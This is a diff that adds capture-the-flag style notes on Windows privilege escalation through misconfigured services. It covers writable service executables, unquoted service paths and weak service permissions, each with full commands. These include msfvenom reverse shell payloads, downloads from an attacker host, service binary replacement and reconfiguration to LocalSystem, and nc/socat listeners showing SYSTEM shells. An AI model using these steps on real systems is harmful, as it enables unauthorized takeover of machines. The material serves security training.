@@ -349,15 +349,246 @@
 >>
 >> Successfully processed 1 files; Failed processing 0 files
 >> ```
-> And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.
+> And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. **This means we can simply overwrite it with any payload of our preference**, and the service will execute it with the privileges of the configured user account.
 >
 > ### ATTACKER MACHINE:
 >> ```
->> 
+>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+>>
+>> user@attackerpc$ python3 -m http.server 8000
+>> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 >> ```
-> # C. Unquoted Service Paths
-> # D. Insecure Service Permissions
+>
+> We can then pull the payload from Powershell with the following command:
+> ### TARGET MACHINE:
+>> ```
+>> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+>> ```
+>
+> Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
+>
+> ### TARGET MACHINE:
+>> ```
+>> C:\> cd C:\PROGRA~2\SYSTEM~1\
+>>
+>> C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+>>         1 file(s) moved.
+>>
+>> C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+>>         1 file(s) moved.
+>>
+>> C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+>>         Successfully processed 1 files.
+>> ```
+>
+> We start a reverse listener on our attack machine:
+> ### ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ nc -lvp 4445 // OR socat TCP-L:4445 
+>> ```
+>
+> And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
+>
+> ### TARGET MACHINE:
+>> ```
+>> C:\> sc stop windowsscheduler
+>> C:\> sc start windowsscheduler
+>> ```
+> > Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.
+>
+> As a result, you'll get a reverse shell with svcusr1 privileges
 > 
+> ### ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ nc -lvp 4445
+>> Listening on 0.0.0.0 4445
+>> Connection received on 10.10.175.90 50649
+>> Microsoft Windows [Version 10.0.17763.1821]
+>> (c) 2018 Microsoft Corporation. All rights reserved.
+>>
+>> C:\Windows\system32>whoami
+>> wprivesc1\svcusr1
+>> 
+>> C:\Windows\system32> more C:\Users\svcusr1\Desktop\flag.txt
+>> // RETRIVE FLAG
+>> ```
+>
+> # C. Unquoted Service Paths
+> When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
+>
+> When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
+>
+> This simply shows a syntax error in the **BINARY_PATH_NAME**. When a path is not surrounded by double quotation marks, it is not properly configured as there are spaces on the name of the path of the specific service folder. The command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute.
+>
+> The command prompt will mistakenly interpret the first line as an executable file and the rest, after the space, is taken as arguments.
+>
+> **Compare:**
+> ```
+> BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
+> ```
+> ```
+> BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+> ```
+>
+> From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
+>
+> While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.
+>
+> In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
+>
+> # TARGET MACHINE:
+>> ```
+>> C:\>icacls c:\MyPrograms
+>> c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+>>               BUILTIN\Administrators:(I)(OI)(CI)(F)
+>>               BUILTIN\Users:(I)(OI)(CI)(RX)
+>>               BUILTIN\Users:(I)(CI)(AD)
+>>               BUILTIN\Users:(I)(CI)(WD)
+>>               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+>>
+>> Successfully processed 1 files; Failed processing 0 file
+>> ```
+>
+> The BUILTIN\\Users group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.
+>
+> # ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+>> 
+>> user@attackerpc$ python3 -m http.server 8000
+>> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+>> ```
+>
+> # TARGET MACHINE (POWERSHELL):
+>> ```
+>> wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
+>> ```
+>
+> # ATTACKER MACHINE:
+>> ```
+>> nc -lvnp 4446 // OR socat TCP-L:4446 -
+>> ```
+>
+>  Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to **C:\MyPrograms\Disk.exe**. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
+>
+> # TARGET MACHINE:
+>> ```
+>> C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+>>
+>> C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+>>         Successfully processed 1 files.
+>> 
+>> C:\> sc stop "disk sorter enterprise"
+>>
+>> C:\> sc start "disk sorter enterprise"
+>> ```
+>
+> # ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ nc -lvp 4446
+>> Listening on 0.0.0.0 4446
+>> connection received on 10.10.175.90 50650
+>> Microsoft Windows [Version 10.0.17763.1821]
+>> (c) 2018 Microsoft Corporation. All rights reserved.
+>>
+>> C:\Windows\system32>whoami
+>> wprivesc1\svcusr2
+>>
+>> C:\Windows\system32>more C:\Users\svcusr2\Desktop\flag.txt
+>> more C:\Users\svcusr2\Desktop\flag.txt
+>> // RETRIEVE FLAG
+>> ```
+
+> # D. Insecure Service Permissions
+> You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted.
+>
+> Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
+>
+> To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
+>
+> # TARGET MACHINE:
+>> ```
+>> C:\>cd C:\tools\AccessChk && accesschk64.exe -qlc thmservice
+>> 
+>> Accesschk v6.14 - Reports effective permissions for securable objects
+>> Copyright ⌐ 2006-2021 Mark Russinovich
+>> Sysinternals - www.sysinternals.com
+>>
+>> thmservice
+>>   DESCRIPTOR FLAGS:
+>>       [SE_DACL_PRESENT]
+>>       [SE_SACL_PRESENT]
+>>       [SE_SELF_RELATIVE]
+>>   OWNER: NT AUTHORITY\SYSTEM
+>>   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+>>         SERVICE_QUERY_STATUS
+>>         SERVICE_QUERY_CONFIG
+>>         SERVICE_INTERROGATE
+>>         SERVICE_ENUMERATE_DEPENDENTS
+>>         SERVICE_PAUSE_CONTINUE
+>>         SERVICE_START
+>>         SERVICE_STOP
+>>         SERVICE_USER_DEFINED_CONTROL
+>>         READ_CONTROL
+>>   [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators  // TAKE NOTE
+>>         SERVICE_ALL_ACCESS
+>> ```
+> Here we can see that the **BUILTIN\\Users** group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
+>
+> Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
+>
+> # ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+>>
+>> user@attackerpc$ python3 -m http.server 9000
+>> Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+>> ```
+> 
+> # TARGET MACHINE (POWERSHELL):
+>> ```
+>> wget http://10.4.124.80:9000/rev-svc3.exe -O rev-svc3.exe
+>> ```
+>
+> # TARGET MACHINE (POWERSHELL):
+>> ```
+>> C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+>>
+>> C:\>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+>> [SC] ChangeServiceConfig SUCCESS
+>>
+>> C:\>sc stop THMService
+>> [SC] ControlService FAILED 1062:
+>>
+>> The service has not been started.
+>>
+>> C:\>sc start THMService
+>>
+>> SERVICE_NAME: THMService
+>>         TYPE               : 10  WIN32_OWN_PROCESS
+>>         STATE              : 4  RUNNING
+>>                                 (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+>>         WIN32_EXIT_CODE    : 0  (0x0)
+>>         SERVICE_EXIT_CODE  : 0  (0x0)
+>>         CHECKPOINT         : 0x0
+>>         WAIT_HINT          : 0x0
+>>         PID                : 2884
+>>         FLAGS              :
+>> ```
+>
+> # ATTACKER MACHINE:
+>> ```
+>> $ socat TCP-L:4447 -
+>> Microsoft Windows [Version 10.0.17763.1821]
+>> (c) 2018 Microsoft Corporation. All rights reserved.
+>>
+>> C:\Windows\system32>whoami
+>> NT AUTHORITY\SYSTEM
+>>
+>> C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
+>> more C:\Users\Administrator\Desktop\flag.txt
+>> // RETRIEVE FLAG
+>> ```
 
 </details>
 
